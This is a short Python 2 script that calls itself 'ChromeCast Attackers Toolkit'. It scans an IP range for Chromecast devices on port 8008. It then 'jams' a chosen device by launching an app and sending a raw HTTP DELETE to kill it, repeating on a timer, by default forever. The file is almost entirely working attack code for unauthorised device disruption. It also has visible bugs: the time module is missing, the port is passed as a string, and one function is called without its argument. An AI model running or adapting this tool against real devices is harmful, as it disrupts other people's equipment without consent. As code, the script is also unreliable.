import socket
import urllib
import urllib2
from netaddr import IPRange


def jam(HOST,PORT):
	lag_time = 0 #Time to wait after starting app before closing it.
	set_time = 10 #Time between runs
	executions = -1 #If set to a negative number, will run forever.
	execute_time = None #If set, overrides executions, will run attack for this many seconds
	if execute_time is not None:
		start_time = time.time()
		executions = -1
	executions += 1
	while executions != 1:

		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
		values = {'_':'1111111111111111'}

		data = urllib.urlencode(values)
		reqs = urllib2.Request(url, data)
		resp = urllib2.urlopen(reqs)
		dat = resp.read()

		time.sleep(lag_time)

		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
		s.connect((HOST, PORT))

		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
		s.sendall(req)
		data = s.recv(10240)
		print data
	
		executions -= 1
		if executions < -1000000:
			executions = -1
		
		if execute_time is not None:
			if time.time() > (start_time + execute_time):
				executions = 1
		
		time.sleep(set_time)
		choose()
		
def chromecast_finder(addresses):
	ccasts = []
	for addr in addresses:
		addr2 = str(addr)
		print addr2
		try :
			request = ("http://"+addr2+":8008/ssdp/device-desc.xml")
			urllib2.urlopen(request, timeout=.5)
			ccasts.append(addr)
			print "1"
			print ""
			#s.close()
			ccasts.append(addr)
		except:
			print "0"
			print ""
	print ""
	return ccasts		
def choose(casts):
	option = raw_input("> ")
	if option == '1':
		
		for x in range(0,len(casts) - 1):
			print '['+str(x)+'] '+str(casts[x])
		ip_attack = raw_input("Which Chromecast to attack: ")
		ip_attack2 = casts[int(ip_attack)]
		
		jam(str(ip_attack2),"8008")
	else:
		print "Invalid input, try again"
		choose(casts)
		

print "ChromeCast Attackers Toolkit"
print ''
addresses = list(IPRange(raw_input('Start IP: '), raw_input('End IP: ')))
casts = chromecast_finder(addresses)
print "[1] Chrome jamslammer"
choose(casts)

	

	
	
		